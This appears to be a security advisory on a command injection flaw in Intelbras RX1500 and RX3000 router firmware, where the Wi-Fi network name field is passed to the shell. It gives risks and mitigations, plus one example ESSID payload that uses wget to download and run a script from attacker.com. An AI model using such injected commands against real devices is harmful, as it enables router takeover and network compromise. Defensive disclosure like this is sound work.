**Critical Vulnerability Discovered in Intelbras RX1500 and RX3000 Devices**

A significant security vulnerability has been identified in specific firmware versions of Intelbras RX1500 and RX3000 router devices. This flaw poses a critical risk, potentially allowing unauthenticated attackers to gain complete control over affected devices, compromise network security, and access sensitive data. Organizations and individuals using these devices must take immediate action to mitigate the risk.

### Vulnerability Details

*   **CVE ID:** **CVE-2025-26063**
*   **Affected Software:**
    *   **Intelbras RX1500** firmware version **2.2.9**
    *   **Intelbras RX3000** firmware version **1.0.11**
*   **Technical Cause:** The vulnerability lies in how the devices process the Wi-Fi network name (ESSID). An unauthenticated attacker can inject malicious code into the ESSID field when creating or configuring a network. This crafted payload is then executed by the device’s underlying operating system, leading to arbitrary code execution.
*   **Example Payload:** An attacker could craft an ESSID similar to the following to execute commands on the device:
    `MyNetwork; /usr/bin/wget http://attacker.com/malware.sh -O /tmp/m.sh; chmod +x /tmp/m.sh; /tmp/m.sh`
    This example demonstrates how a malicious script could be downloaded and executed, providing the attacker with full control.

### Risk Description

If exploited, this **arbitrary code execution** vulnerability grants attackers full administrative control over the affected Intelbras router. This level of compromise can lead to severe consequences, including:

*   **Network Interception:** Attackers could monitor, intercept, or redirect all network traffic passing through the device.
*   **Data Theft:** Sensitive data transmitted over the network (passwords, financial information, confidential documents) could be stolen.
*   **System Takeover:** The device could be used as a pivot point to attack other systems within the internal network.
*   **Malware Installation:** Attackers could install persistent backdoors, botnet agents, or other malware directly onto the router.
*   **Service Disruption:** The device could be rendered inoperable, disrupting internet connectivity and critical business operations.

### Who is at Risk

Any organization or individual currently using **Intelbras RX1500 devices with firmware version 2.2.9** or **Intelbras RX3000 devices with firmware version 1.0.11** is at direct risk. These devices are commonly used in home networks, small to medium-sized businesses, and distributed enterprise environments.

### Recommendations

**For Device Owners and Network Administrators:**

1.  **Immediate Firmware Update:** Check for and install the latest firmware updates released by Intelbras. This is the most crucial step to patch the vulnerability. Refer to the official Intelbras support channels for updated firmware versions.
2.  **Network Segmentation:** Isolate critical systems on a separate network segment if immediate patching is not possible.
3.  **Monitor Network Traffic:** Implement network monitoring to detect unusual activity originating from or targeting your Intelbras devices.
4.  **Review Configurations:** Ensure that default credentials have been changed and that unnecessary services are disabled.

**For Developers (Vendor – Intelbras):**

1.  **Input Validation and Sanitization:** Implement rigorous input validation and sanitization for all user-supplied data, especially for fields like the ESSID that can be processed by system commands.
2.  **Secure Coding Practices:** Adopt secure coding practices, avoiding the direct execution of unsanitized user input in shell commands or other sensitive functions. Utilize safer APIs that explicitly separate commands from arguments.
3.  **Security Audits:** Conduct regular security audits and penetration tests on firmware to identify and remediate vulnerabilities proactively.
